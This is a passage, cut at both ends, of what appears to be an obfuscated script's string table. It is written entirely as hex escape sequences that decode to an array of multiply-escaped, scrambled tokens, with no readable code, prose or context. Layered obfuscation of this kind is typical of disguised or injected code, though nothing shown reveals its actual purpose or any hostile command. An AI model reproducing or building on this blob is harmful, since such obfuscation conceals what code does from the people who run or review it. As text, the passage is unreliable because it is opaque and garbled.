c\x42\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x31\x63\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x31\x63\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x56\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x32\x43\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x31\x6b\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x31\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6d\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x56\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x31\x70\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x31\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x47\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x6d\x22\x2c\x22\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x31\x55\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x31\x48\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x22\x2c\x22\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x22\x2c\x22\x5c\x5c\x5c\x5c\x5a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x32\x68\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x42\x22\x2c\x22\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x66\x22\x2c\x22\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x69\x22\x2c\x22\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x32\x79\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x31\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x32\x77\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x22\x2c\x22\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x31\x6a\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6f\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x4d\x22\x2c\x22\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6d\x22\x2c\x22\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x56\x22\x2c\x22\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x33\x62\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x71\x22\x2c\x22\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x4d\x22\x2c\x22\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x69\x22\x2c\x22\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6d\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x42\x22\x2c\x22\x5c\x5c\x5c\x5c\x6b\x22\x2c\x22\x5c\x5c\x5c\x5c\x31\x48\x5c\x5c\x5c\x5c\x6b\x22\x2c\x22\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x74\x22\x2c\x22\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x75\x22\x2c\x22\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x32\x62\x5c\x5c\x5c\x5c\x44\x22\x2c\x22\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x31\x6a\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x42\x22\x2c\x22\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x32\x43\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x31\x6a\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x42\x22\x2c\x22\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x33\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x42\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x31\x56\x5c\x5c\x5c\x5c\x31\x66\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x31\x6c\x5c\x5c\x5c\x5c\x32\x70\x5c\x5c\x5c\x5c\x5a\x5c\x5c\x5c\x5c\x5a\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6c\x22\x2c\x22\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x51\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x48\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x22\x2c\x22\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x75\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x74\x5c\x5c\x5c\x5c\x73\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x31\x71\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x77\x5c\x5c\x5c\x5c\x72\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x4d\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x46\x5c